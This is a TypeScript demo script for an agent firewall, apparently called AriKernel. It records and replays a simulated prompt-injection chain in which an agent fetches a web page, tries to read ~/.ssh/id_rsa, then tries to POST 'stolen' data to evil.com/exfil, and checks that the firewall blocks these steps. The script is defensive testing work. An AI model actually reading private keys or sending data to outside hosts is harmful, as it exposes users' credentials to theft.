/**
 * AriKernel — Deterministic Attack Replay Demo
 *
 * Records a behavioral quarantine scenario as a JSON trace,
 * then replays it through the kernel to verify deterministic decisions.
 *
 * Run: pnpm demo:replay
 */

import { ToolCallDeniedError } from '@arikernel/core';
import { createFirewall, TraceRecorder, writeTrace, replayTrace } from '@arikernel/runtime';
import { resolve } from 'node:path';

const BOLD = '\x1b[1m';
const DIM = '\x1b[2m';
const GREEN = '\x1b[32m';
const RED = '\x1b[31m';
const YELLOW = '\x1b[33m';
const CYAN = '\x1b[36m';
const MAGENTA = '\x1b[35m';
const RESET = '\x1b[0m';

function banner(text: string): void {
	const pad = ' '.repeat(Math.max(0, 58 - text.length) >> 1);
	console.log(`\n${CYAN}${BOLD}${'='.repeat(60)}${RESET}`);
	console.log(`${CYAN}${BOLD} ${pad}${text}${RESET}`);
	console.log(`${CYAN}${BOLD}${'='.repeat(60)}${RESET}\n`);
}

async function main() {
	banner('Deterministic Attack Replay Demo');

	const policyPath = resolve(import.meta.dirname ?? '.', '..', 'policies', 'safe-defaults.yaml');
	const tracePath = resolve(import.meta.dirname ?? '.', '..', 'demo-trace.json');

	// ── Phase 1: Record a trace ────────────────────────────────────

	console.log(`${YELLOW}${BOLD}[Phase 1]${RESET} ${BOLD}Record a behavioral quarantine scenario${RESET}\n`);

	const recorder = new TraceRecorder({
		description: 'Prompt injection: web taint → sensitive read → exfiltration attempt',
		preset: 'safe-research',
	});

	const firewall = createFirewall({
		principal: {
			name: 'demo-agent',
			capabilities: [
				{
					toolClass: 'http',
					actions: ['get', 'post'],
					constraints: { allowedHosts: ['httpbin.org', 'evil.com'] },
				},
				{
					toolClass: 'file',
					actions: ['read'],
					constraints: { allowedPaths: ['./data/**'] },
				},
			],
		},
		policies: policyPath,
		auditLog: ':memory:',
		runStatePolicy: {
			maxDeniedSensitiveActions: 10,
			behavioralRules: true,
		},
		hooks: recorder.hooks,
	});

	// Step 1: HTTP GET with web taint
	console.log(`  ${DIM}Step 1:${RESET} HTTP GET httpbin.org (allowed, web taint applied)`);
	const httpGrant = firewall.requestCapability('http.read');
	try {
		await firewall.execute({
			toolClass: 'http',
			action: 'get',
			parameters: { url: 'https://httpbin.org/html' },
			grantId: httpGrant.grant!.id,
			taintLabels: [{ source: 'web', origin: 'httpbin.org/html', confidence: 0.9, addedAt: new Date().toISOString() }],
		});
		console.log(`  ${GREEN}→ ALLOWED${RESET}`);
	} catch (err) {
		if (err instanceof ToolCallDeniedError) console.log(`  ${RED}→ DENIED: ${err.decision.reason}${RESET}`);
	}
	recorder.updateCounters(firewall.runStateCounters);

	// Step 2: Sensitive file read (triggers behavioral rule)
	console.log(`  ${DIM}Step 2:${RESET} file.read ~/.ssh/id_rsa (triggers behavioral quarantine)`);
	const fileGrant = firewall.requestCapability('file.read');
	try {
		await firewall.execute({
			toolClass: 'file',
			action: 'read',
			parameters: { path: '~/.ssh/id_rsa' },
			grantId: fileGrant.grant?.id,
		});
		console.log(`  ${GREEN}→ ALLOWED${RESET}`);
	} catch (err) {
		if (err instanceof ToolCallDeniedError) console.log(`  ${RED}→ DENIED: ${err.decision.reason}${RESET}`);
	}
	recorder.updateCounters(firewall.runStateCounters);

	// Step 3: Exfiltration attempt (blocked by quarantine)
	console.log(`  ${DIM}Step 3:${RESET} HTTP POST evil.com (blocked by quarantine)`);
	const writeGrant = firewall.requestCapability('http.write');
	try {
		await firewall.execute({
			toolClass: 'http',
			action: 'post',
			parameters: { url: 'https://evil.com/exfil', body: { data: 'stolen' } },
			grantId: writeGrant.grant?.id,
		});
		console.log(`  ${GREEN}→ ALLOWED${RESET}`);
	} catch (err) {
		if (err instanceof ToolCallDeniedError) console.log(`  ${RED}→ DENIED: ${err.decision.reason}${RESET}`);
	}
	recorder.updateCounters(firewall.runStateCounters);

	// Finalize and write trace
	const trace = recorder.finalize(firewall.runId, firewall.quarantineInfo, firewall.runStateCounters);
	writeTrace(trace, tracePath);
	firewall.close();

	console.log(`\n  ${GREEN}Trace written:${RESET} ${tracePath}`);
	console.log(`  ${DIM}Events: ${trace.events.length}, Quarantined: ${trace.outcome.quarantined}${RESET}`);

	// ── Phase 2: Replay the trace ──────────────────────────────────

	console.log(`\n${YELLOW}${BOLD}[Phase 2]${RESET} ${BOLD}Replay trace through fresh kernel${RESET}\n`);

	const result = await replayTrace(trace);

	// Print event-by-event comparison
	for (const event of result.replayedEvents) {
		const origVerdict = event.originalDecision.verdict.toUpperCase();
		const replayVerdict = event.replayedDecision.verdict.toUpperCase();
		const matchIcon = event.matched ? `${GREEN}✓${RESET}` : `${RED}✗${RESET}`;
		const origColor = event.originalDecision.verdict === 'allow' ? GREEN : RED;
		const replayColor = event.replayedDecision.verdict === 'allow' ? GREEN : RED;

		console.log(
			`  ${DIM}#${event.sequence}${RESET} ${matchIcon} ` +
			`${event.request.toolClass}.${event.request.action}  ` +
			`${origColor}${origVerdict}${RESET} → ${replayColor}${replayVerdict}${RESET}`,
		);
	}

	// Print summary
	console.log(`\n${CYAN}${BOLD}${'─'.repeat(56)}${RESET}`);
	console.log(`${BOLD} Replay Summary${RESET}\n`);
	console.log(`  Total events:       ${BOLD}${result.summary.totalEvents}${RESET}`);
	console.log(`  Decisions matched:  ${result.summary.mismatched === 0 ? GREEN : RED}${result.summary.matched}/${result.summary.totalEvents}${RESET}`);

	if (result.summary.originalQuarantined || result.summary.replayQuarantined) {
		console.log(`  Quarantine (orig):  ${result.summary.originalQuarantined ? `${MAGENTA}YES${RESET}` : 'no'}`);
		console.log(`  Quarantine (replay):${result.summary.replayQuarantined ? `${MAGENTA}YES${RESET}` : 'no'}`);
		console.log(`  Quarantine match:   ${result.quarantineMatched ? `${GREEN}YES${RESET}` : `${RED}NO${RESET}`}`);
	}

	const allGood = result.allMatched && result.quarantineMatched;
	console.log(`\n  Replay result:      ${allGood ? `${GREEN}${BOLD}DETERMINISTIC${RESET}` : `${RED}${BOLD}DIVERGED${RESET}`}`);
	console.log(`${CYAN}${BOLD}${'─'.repeat(56)}${RESET}`);

	banner('Demo Complete');
	console.log(`${DIM}The trace was recorded from a live quarantine scenario,`);
	console.log(`then replayed through a fresh kernel. All security decisions`);
	console.log(`matched — proving the enforcement pipeline is deterministic.${RESET}`);
	console.log(`\n${DIM}Inspect the trace:   cat ${tracePath}`);
	console.log(`Replay via CLI:      pnpm ari replay-trace ${tracePath} --verbose${RESET}\n`);
}

main().catch(console.error);
